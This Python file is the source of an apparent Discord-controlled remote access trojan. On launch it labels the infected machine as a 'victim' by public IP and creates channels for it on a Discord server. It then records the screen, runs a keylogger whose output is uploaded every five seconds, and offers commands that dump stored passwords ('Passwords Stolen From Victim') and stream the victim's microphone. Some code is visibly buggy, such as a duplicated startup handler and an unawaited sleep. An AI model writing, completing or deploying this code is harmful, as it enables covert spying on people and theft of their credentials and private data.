import discord
import discord.ext.commands
import os
from discord.ext import commands,tasks
from dotenv import load_dotenv
import requests
import datetime
from bot_core import fetch_victim_info
from bot_core import keylogger
import asyncio
import tempfile
from bot_core import passwordstealer
intents = discord.Intents.default()
import pyaudio
import threading
from bot_core import screenrecord


intents.message_content = True
intents.members = True
intents.voice_states = True
intents.guilds = True

bot = commands.Bot(command_prefix='.',intents=intents)

load_dotenv()
TOKEN = "tokenhere"

#logging
def log(message):
    with open("botlogs.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {message}\n")


CHANNEL_NAME = 'keylogger'
LOG_FILE = os.path.join(tempfile.gettempdir(), 'log.txt')

@tasks.loop(seconds=5)
async def send_logs():
    if not os.path.exists(LOG_FILE):
        return

    with open(LOG_FILE, 'r') as f:
        content = f.read()

    if content.strip() == '':
        return

    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name == CHANNEL_NAME:
                await channel.send(f"```\n{content}\n```")
                break

    open(LOG_FILE, 'w').close()



@bot.event
async def on_ready():
    log('BOT IS ONLINE')

    try:
        public_ip = requests.get("https://api.ipify.org").text.strip()
        category_name = f"victim-{public_ip.replace('.', '-')}"
    except Exception as e:
        category_name = "victim-unknown"
        log(f"[!] Failed to get IP: {e}")

    guild = discord.utils.get(bot.guilds)
    category = discord.utils.get(guild.categories, name=category_name)

    if not category:
        category = await guild.create_category(category_name)
        log(f"✅ Created category: {category_name}")
    else:
        log(f"⚠️ Category already exists: {category_name}")

    channel_names = [
        "Victiminfo",
        "control-panel",
        "file-related",
        "recording",
        "screenshots",
        "keylogger"
    ]

    for name in channel_names:
        existing = discord.utils.get(guild.text_channels, name=name.lower())
        if not existing:
            await guild.create_text_channel(name=name, category=category)
            log(f"✅ Created channel: {name}")
    
    asyncio.sleep(3)
   
    for guild in bot.guilds:
        channel = discord.utils.get(guild.text_channels, name="victiminfo") 
        if channel:
            await channel.send(fetch_victim_info.info_string)
            
    await screenrecord.record_and_send_screen(bot)
    
    keylogger.start_keylogger()



PASSWORD_FILE = os.path.join(tempfile.gettempdir(), 'passwords.csv')
@bot.command
async def stealpasswords(ctx):
    passwordstealer.dump_passwords()
    await asyncio.sleep(2)

    try:
        await ctx.send("Passwords Stolen From Victim",file = discord.file(PASSWORD_FILE))
    except Exception as e:
        await ctx.send(f"Failed to send file: {e}")

  
mic_streaming = False
temp_vc_channel = None

@bot.event
async def on_ready():
    pass


@bot.command()
async def join(ctx):
    global mic_streaming, temp_vc_channel

    guild = ctx.guild

    
    temp_vc_channel = await guild.create_voice_channel(name="Mic Stream")
    await ctx.send(f"🎤 Created VC: {temp_vc_channel.name}")

    
    vc = await temp_vc_channel.connect()
    await ctx.send("🔊 Bot joined VC and streaming mic...")

    mic_streaming = True

    def stream_microphone():
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=48000,
                        input=True, frames_per_buffer=960)

        while mic_streaming and vc.is_connected():
            try:
                data = stream.read(960, exception_on_overflow=False)
                vc.send_audio_packet(data, encode=False)
            except Exception as e:
                break

        stream.stop_stream()
        stream.close()
        p.terminate()

    threading.Thread(target=stream_microphone, daemon=True).start()


@bot.command()
async def leave(ctx):
    global mic_streaming, temp_vc_channel

    mic_streaming = False

    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("🛑 Left VC.")

    if temp_vc_channel:
        await temp_vc_channel.delete()
        await ctx.send("❌ Deleted the VC.")
        temp_vc_channel = None


bot.run(TOKEN)